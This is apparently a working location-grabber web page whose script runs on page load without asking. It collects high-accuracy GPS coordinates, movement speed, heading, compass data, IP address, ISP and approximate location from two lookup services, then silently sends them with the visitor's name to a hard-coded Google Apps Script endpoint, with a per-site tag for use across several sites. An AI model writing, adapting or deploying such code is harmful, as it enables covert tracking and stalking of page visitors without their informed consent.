<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Location Permission</title>
</head>
<body>

  <label for="nameInput">Name (optional)</label>
  <input type="text" id="nameInput" placeholder="Enter your name" autocomplete="name">

<script>
  // ---- Settings (edit these) ----
  const WEBSITE_NAME = 'hehe';   // <-- Website_Name written to the sheet; change per website
  const ENDPOINT = 'https://script.google.com/macros/s/AKfycbxu0VnliJ6G6sIEc3VbNkibt_Yz3DGinBg0iGwrFngxC5O_uhCV6s5KaLvfBS0W8uF__Q/exec';   // Apps Script Web App URL (ends with /exec)

  const CONTINENT_CODE = { AF:'Africa', AN:'Antarctica', AS:'Asia', EU:'Europe', NA:'North America', OC:'Oceania', SA:'South America' };

  const $ = id => document.getElementById(id);
  const withTimeout = (p, ms) => Promise.race([p, new Promise(r => setTimeout(() => r(null), ms))]);

  // ---- DMS Converter (for GPS 1 - new style) ----
  function toDMS(coordinate) {
    var absolute = Math.abs(coordinate);
    var degrees = Math.floor(absolute);
    var minutesNotTruncated = (absolute - degrees) * 60;
    var minutes = Math.floor(minutesNotTruncated);
    var seconds = ((minutesNotTruncated - minutes) * 60).toFixed(2);
    return degrees + "°" + minutes + "'" + seconds + '"';
  }

  // ---- GPS 1: Simple geolocation (new upload method) ----
  function getGPS1() {
    return new Promise(resolve => {
      navigator.geolocation.getCurrentPosition(
        p => resolve({
          latitude: p.coords.latitude,
          longitude: p.coords.longitude,
          altitude: p.coords.altitude,
          accuracy: p.coords.accuracy,
          speed: p.coords.speed,
          dms_lat: toDMS(p.coords.latitude),
          dms_lng: toDMS(p.coords.longitude)
        }),
        err => resolve(null),
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    });
  }

  // ---- GPS 2: Advanced geolocation with heading & fallback (old method) ----
  function readPosition(opts) {
    return new Promise(resolve => {
      navigator.geolocation.getCurrentPosition(
        p => resolve({ ok: true, gps: {
          latitude: p.coords.latitude, longitude: p.coords.longitude,
          altitude: p.coords.altitude, accuracy: p.coords.accuracy,
          speed: p.coords.speed, heading: p.coords.heading,
          _t: p.timestamp,
          timezone: (window.Intl && Intl.DateTimeFormat) ? Intl.DateTimeFormat().resolvedOptions().timeZone : ''
        }}),
        err => resolve({ ok: false, denied: err.code === 1 }),
        opts
      );
    });
  }

  const toRad_ = d => d * Math.PI / 180;

  function haversineMeters_(lat1, lng1, lat2, lng2) {
    const R = 6371000;
    const dLat = toRad_(lat2 - lat1), dLng = toRad_(lng2 - lng1);
    const a = Math.sin(dLat / 2) ** 2 +
              Math.cos(toRad_(lat1)) * Math.cos(toRad_(lat2)) * Math.sin(dLng / 2) ** 2;
    return 2 * R * Math.asin(Math.sqrt(a));
  }

  function bearingDegrees_(lat1, lng1, lat2, lng2) {
    const y = Math.sin(toRad_(lng2 - lng1)) * Math.cos(toRad_(lat2));
    const x = Math.cos(toRad_(lat1)) * Math.sin(toRad_(lat2)) -
              Math.sin(toRad_(lat1)) * Math.cos(toRad_(lat2)) * Math.cos(toRad_(lng2 - lng1));
    return (Math.atan2(y, x) * 180 / Math.PI + 360) % 360;
  }

  function getMotionFallback_(fix1) {
    return new Promise(resolve => {
      if (!navigator.geolocation) { resolve(null); return; }
      let done = false, watchId = null;
      const finish = v => {
        if (done) return;
        done = true;
        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
        resolve(v);
      };
      watchId = navigator.geolocation.watchPosition(p => {
        const dtSec = (p.timestamp - fix1._t) / 1000;
        if (dtSec < 2) return;
        const distance = haversineMeters_(fix1.latitude, fix1.longitude, p.coords.latitude, p.coords.longitude);
        const movedBeyondNoise = distance > Math.max(p.coords.accuracy || 0, fix1.accuracy || 0, 5);
        finish({
          speed: distance / dtSec,
          heading: movedBeyondNoise ? bearingDegrees_(fix1.latitude, fix1.longitude, p.coords.latitude, p.coords.longitude) : null
        });
      }, () => finish(null), { enableHighAccuracy: true, maximumAge: 0, timeout: 6000 });
      setTimeout(() => finish(null), 6000);
    });
  }

  function getCompassHeading_() {
    return new Promise(resolve => {
      if (typeof DeviceOrientationEvent === 'undefined') { resolve(null); return; }
      let settled = false;
      const onEvent = e => {
        if (typeof e.webkitCompassHeading === 'number' && !isNaN(e.webkitCompassHeading)) {
          finish(e.webkitCompassHeading);
        } else if (e.absolute === true && typeof e.alpha === 'number' && !isNaN(e.alpha)) {
          finish((360 - e.alpha) % 360);
        }
      };
      const finish = v => {
        if (settled) return;
        settled = true;
        window.removeEventListener('deviceorientationabsolute', onEvent, true);
        window.removeEventListener('deviceorientation', onEvent, true);
        resolve(v);
      };
      const attach = () => {
        window.addEventListener('deviceorientationabsolute', onEvent, true);
        window.addEventListener('deviceorientation', onEvent, true);
        setTimeout(() => finish(null), 2500);
      };
      if (typeof DeviceOrientationEvent.requestPermission === 'function') {
        DeviceOrientationEvent.requestPermission().then(state => {
          if (state === 'granted') attach(); else finish(null);
        }).catch(() => finish(null));
      } else {
        attach();
      }
    });
  }

  async function getGPS2() {
    if (!navigator.geolocation) return null;
    let r = await readPosition({ enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
    if (!r.ok && !r.denied) r = await readPosition({ enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 });
    if (!r.ok) return null;
    const gps = r.gps;
    const missing = v => v === null || v === undefined || isNaN(v);

    if (missing(gps.speed) || missing(gps.heading)) {
      const motion = await getMotionFallback_(gps);
      if (motion) {
        if (missing(gps.speed)) gps.speed = motion.speed;
        if (missing(gps.heading) && motion.heading !== null) gps.heading = motion.heading;
      }
    }
    if (missing(gps.heading)) {
      const compass = await getCompassHeading_();
      if (compass !== null) gps.heading = compass;
    }

    delete gps._t;
    return gps;
  }

  async function getIPAPI() {
    const ctl = new AbortController();
    const t = setTimeout(() => ctl.abort(), 10000);
    try {
      const d = await (await fetch('https://ipapi.co/json/', { signal: ctl.signal })).json();
      if (!d || d.error) return null;
      return {
        ip: d.ip || '', version: d.version || '',
        isp: d.org || '', org: d.org || '',
        latitude: d.latitude, longitude: d.longitude,
        timezone: d.timezone || '', utcOffset: d.utc_offset || '',
        continent: CONTINENT_CODE[d.continent_code] || ''
      };
    } catch (e) { return null; } finally { clearTimeout(t); }
  }

  async function getIPWHO() {
    const ctl = new AbortController();
    const t = setTimeout(() => ctl.abort(), 10000);
    try {
      const d = await (await fetch('https://ipwho.is/', { signal: ctl.signal })).json();
      if (!d || !d.success) return null;
      return {
        ip: d.ip || '', version: d.type || '',
        isp: (d.connection && d.connection.isp) || '',
        org: (d.connection && d.connection.org) || '',
        latitude: d.latitude, longitude: d.longitude,
        timezone: (d.timezone && d.timezone.id) || '',
        utcOffset: (d.timezone && d.timezone.utc) || '',
        continent: d.continent || ''
      };
    } catch (e) { return null; } finally { clearTimeout(t); }
  }

  // ---- Auto-send on page load ----
  window.addEventListener('DOMContentLoaded', async () => {
    if (!ENDPOINT.startsWith('https://script.google.com/')) return;

    const date = new Date().toISOString();   // client-side date captured at load time

    const [gps1, gps2, ipapi, ipwho] = await Promise.all([
      withTimeout(getGPS1(), 30000),
      withTimeout(getGPS2(), 45000),
      getIPAPI(),
      getIPWHO()
    ]);

    if (!gps1 && !gps2 && !ipapi && !ipwho) return;

    const name = ($('nameInput').value || '').trim();   // read name at submit time

    try {
      await fetch(ENDPOINT, {
        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'text/plain;charset=utf-8' },
        body: JSON.stringify({ website: WEBSITE_NAME, name, date, gps1, gps2, ipapi, ipwho })
      });
    } catch (e) { /* silent fail */ }
  });
</script>
</body>
</html>
